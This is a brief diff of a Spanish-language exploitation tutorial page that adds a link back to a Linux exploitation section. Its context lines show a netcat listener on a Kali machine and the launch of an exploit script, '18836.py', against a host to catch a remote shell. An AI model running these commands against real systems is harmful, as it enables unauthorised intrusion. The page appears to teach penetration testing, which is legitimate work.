@@ -58,3 +58,5 @@ Para la explotación manual con python, el script está configurado por defecto 
 nc -nvlp port_kali
 python2 18836.py host.com 80
 ```
+
+[⟵ Anterior](../05_sistema.md#explotación-linux)
